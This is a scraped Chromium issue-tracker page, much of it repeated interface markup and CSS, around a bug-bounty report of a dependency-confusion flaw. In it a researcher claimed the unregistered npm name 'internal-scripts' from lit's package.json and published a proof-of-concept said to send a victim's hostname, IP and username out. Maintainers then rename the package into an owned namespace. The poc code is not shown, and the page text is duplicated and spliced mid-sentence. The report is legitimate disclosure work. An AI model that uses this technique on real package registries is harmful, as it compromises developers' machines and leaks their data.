        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>

confusion<span class="line"><!---->Remote Code Execution(RCE) via Dependency confusion<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span class="line"><!---->### Bug location<!----></span><br><br><br>#### Which product or website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Other - Chrome VRP<span class="line"><!---->Other - Chrome VRP<!----></span><br><br><br>#### Which URL have you found the vulnerability in?<span class="line"><!---->#### Which URL have you found the vulnerability in?<!----></span><br><br>https://github.com/chromium/chromium<a class="undefined" target="_blank" class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi,<span class="line"><!---->Hi,<!----></span><br><br>I found a [package.json](<span class="line"><!---->I found a [package.json](<!----></span>https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<a class="undefined" target="_blank" href="https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json"><!---->https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<!----></a>)<span class="line"><!---->)<!----></span> file, and unclaimed NPM dependency: **internal-scripts** in the dependencies section of [package.json](<span class="line"><!----> file, and unclaimed NPM dependency: **internal-scripts** in the dependencies section of [package.json](<!----></span>https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<a class="undefined" target="_blank" I made package.json file with the name: internal-scripts and malicious file poc.js  by "npm init" command and published this package on my account.<span class="line"><!----> and it was giving me 404 error, dependency was unclaimed.         After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<span class="line"><!---->After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<!----></span><br><br>To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<span class="line"><!---->To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<!----></span><br><br>Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<span class="line"><!---->Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<!----></span><br><br>Assigning this to aomarks@ who added this in <span class="line"><!---->Assigning this to aomarks@ who added this in <!----></span>https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<a class="undefined" target="_blank" href="https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46"><!---->https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<!----></a><mr-comment-content></mr-comment-content>

        I just merged <span class="line"><!---->I just merged <!----></span>https://github.com/lit/lit/pull/3024<a class="undefined" target="_blank" href="https://github.com/lit/lit/pull/3024"><!---->https://github.com/lit/lit/pull/3024<!----></a>,<span class="line"><!---->,<!----></span> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<span class="line"><!----> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<!----></span><mr-comment-content></mr-comment-content>

        by

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

    <mr-error hidden=""><!----><!----></mr-error>
        
          
       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">
      
        <slot></slot>
      <label for="checkbox">
        <slot></slot>
      </label>
    Send email<chops-checkbox id="sendEmail">Send email</chops-checkbox>
          
            
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
              Discard
            <chops-button id="discard" class="de-emphasized">
              Discard
            </chops-button>
            
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
              Save changes
            <chops-button id="save" class="emphasized">
              Save changes
            </chops-button>
          <div>
            <chops-button id="discard" class="de-emphasized">
              Discard
            </chops-button>
            <chops-button id="save" class="emphasized">
              Save changes
            </chops-button>
          </div>
        <div class="edit-controls">
          <chops-checkbox id="sendEmail">Send email</chops-checkbox>
          <div>
            <chops-button id="discard" class="de-emphasized">
              Discard
            </chops-button>

        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;

        for LitElement.

      <style>
        mr-issue-page {

        }

        }

          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }

          padding: 0;
          flex-grow: 1;

          width: 100%;

          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }

          padding: 0.5em 16px;

        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;

            width: 100%;
            padding: 0;
            border: 0;
          }

            min-height: 0;

    <mr-app loginurl="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fuc.appengine.google.com%2F_ah%2Fconflogin%3Fcontinue%3Dhttps%253A%252F%252Fbugs.chromium.org%252Fp%252Fchromium%252Fissues%252Fdetail%253Fid%253D1332593%2526q%253Dlabel%25253Aexternal_security_report%2526can%253D1%2526start%253D2400" logouturl="https://bugs.chromium.org/_ah/logout?continue=https://accounts.google.com/Logout%3Fcontinue%3Dhttps://uc.appengine.google.com/_ah/logout%253Fcontinue%253Dhttps://www.google.com/url%25253Fsa%25253DD%252526q%25253Dhttps://bugs.chromium.org/p/chromium/issues/detail%2525253Fid%2525253D1332593%25252526q%2525253Dlabel%252525253Aexternal_security_report%25252526can%2525253D1%25252526start%2525253D2400%252526ust%25253D1703405004932354%252526usg%25253DAOvVaw0IxJ60kCPW5EdgTnO2Jtqi%26service%3Dah" versionbase="https://61906-5c6a57f-dot-monorail-prod.appspot.com" projectalert=""><!---->
      <style>
        
  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }

          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }

          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

          display: block;

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      ---<span class="line"><!---->---<!----></span><br><br>### Report description<span class="line"><!---->### Report description<!----></span><br><br><br>Remote Code Execution(RCE) via Dependency confusion<span class="line"><!---->Remote Code Execution(RCE) via Dependency confusion<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span class="line"><!---->### Bug location<!----></span><br><br><br>#### Which product or website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Other - Chrome VRP<span class="line"><!---->Other - Chrome VRP<!----></span><br><br><br>#### Which URL have you found the vulnerability in?<span class="line"><!---->#### Which URL have you found the vulnerability in?<!----></span><br><br>https://github.com/chromium/chromium<a class="undefined" target="_blank" href="https://github.com/chromium/chromium"><!---->https://github.com/chromium/chromium<!----></a><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The problem<span class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi,<span class="line"><!---->Hi,<!----></span><br><br>I found a [package.json](<span class="line"><!---->I found a [package.json](<!----></span>https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<a class="undefined" target="_blank" href="https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json"><!---->https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<!----></a>)<span class="line"><!---->)<!----></span> file, and unclaimed NPM dependency: **internal-scripts** in the dependencies section of [package.json](<span class="line"><!----> file, and unclaimed NPM dependency: **internal-scripts** in the dependencies section of [package.json](<!----></span>https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<a class="undefined" target="_blank" href="https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json"><!---->https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<!----></a>)<span class="line"><!---->)<!----></span> file of Chromium project on github.<span class="line"><!----> file of Chromium project on github.<!----></span><br>I searched this dependency: **internal-scripts** on<span class="line"><!---->I searched this dependency: **internal-scripts** on<!----></span> <span class="line"><!----> <!----></span>npmjs.com<a class="undefined" target="_blank" href="https://npmjs.com"><!---->npmjs.com<!----></a> and it was giving me 404 error, dependency was unclaimed. I made package.json file with the name: internal-scripts and malicious file poc.js  by "npm init" command and published this package on my account.<span class="line"><!----> and it was giving me 404 error, dependency was unclaimed. I made package.json file with the name: internal-scripts and malicious file poc.js  by "npm init" command and published this package on my account.<!----></span><br><br>Steps to Reproduce:<span class="line"><!---->Steps to Reproduce:<!----></span><br>1. Developers mentioned "internal-scripts" in devDependencies section of [package.json](<span class="line"><!---->1. Developers mentioned "internal-scripts" in devDependencies section of [package.json](<!----></span>https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<a class="undefined" target="_blank" href="https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json"><!---->https://github.com/chromium/chromium/blob/main/third_party/material_web_components/components-chromium/node_modules/lit/package.json<!----></a>)<span class="line"><!---->)<!----></span> file.<span class="line"><!----> file.<!----></span><br>2. This package was unclaimed and i claimed this on public [registery](<span class="line"><!---->2. Go to this link: <span class="line"><!---->3. Go to this link: <!----></span>https://www.npmjs.com/package/internal-scripts<a class="undefined" target="_blank" href="https://www.npmjs.com/package/internal-scripts"><!---->https://www.npmjs.com/package/internal-scripts<!----></a><br>4. You will see this internal-scripts dependency claimed by me.<span class="line"><!---->4. You will see this internal-scripts dependency claimed by me.<!----></span><br>5. attacker able to Remotely execute his code on victim's machine.<span class="line"><!---->5. attacker able to Remotely execute his code on victim's machine.<!----></span><br><br>I uploaded following code in package.json file:<span class="line"><!---->I uploaded following code in package.json file:<!----></span><br><br>{<span class="line"><!---->{<!----></span><br>  "name": "internal-scripts",<span class="line"><!---->  "name": "internal-scripts",<!----></span><br>  "version": hostname, directory, ipaddress, username to attacker.<span class="line"><!---->I(attacker) am able to remotly execute code on developers machine. when they use this project and use install dependencies from this project, my malicious(internal-scripts) dependency will install with all the dependecies and poc.js file will run code on victim's machine and will send the hostname, directory, ipaddress, username to attacker.<!----></span><br><br>Note: **Please see video POC for better explaination**<span class="line"><!---->Note: **Please see video POC for better         After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<span class="line"><!---->After some investigating, this doesn't run in the common flow of uprevving packages in the third_party/material_web_components directory.<!----></span><br><br>To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<span class="line"><!---->To get the internal-scripts package to install on my machine, I had to cd into node_modules/lit and run npm install there, whereas the update script reproduce.sh doesn't install dev dependencies for subpackages, and I don't see any reason any dev would cd into that folder and run npm install.<!----></span><br><br>Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<span class="line"><!---->Even so, this _is_ problematic and the lit team should remove it from their package.json, as demonstrated by the 90 weekly downloads the internal-scripts package has.<!----></span><br><br>Assigning this to aomarks@ who added this in <span class="line"><!---->Assigning this to aomarks@ who added this in <!----></span>https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<a class="undefined" target="_blank" href="https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46"><!---->https://github.com/lit/lit/commit/0511d4061ab8cb95a78cfb292bc1c0c5f96f6e46<!----></a><mr-comment-content></mr-comment-content>

        I just merged <span class="line"><!---->I just merged <!----></span>https://github.com/lit/lit/pull/3024<a class="undefined" target="_blank" href="https://github.com/lit/lit/pull/3024"><!---->https://github.com/lit/lit/pull/3024<!----></a>,<span class="line"><!---->,<!----></span> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<span class="line"><!----> which renames Lit's `internal-scripts` package to `@lit-internal/scripts`, along with a number of other internal-only packages. `@lit-internal` is an npm namespace that we own, so packages within it cannot be registered by anybody else.<!----></span><mr-comment-content></mr-comment-content>

        Note that bugs marked as "None" impact can still be subject to VRP rewards if assessed as such by the VRP panel. However, the labels are for our bookkeeping purposes, not to say that this is not an issue.<span class="line"><!---->Note that bugs marked as "None" impact can still be subject to VRP rewards if assessed as such by the VRP panel. However, the labels are for our bookkeeping purposes, not to say that this is not an issue.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>

        </div>
      </div>

          Labels:<strong><!---->Labels:</strong>
          
          -reward-topanel reward-unpaid reward-1000
          
          <br>
        
        
      <div class="issue-diff">
        <!---->
          <strong><!---->Labels:</strong>
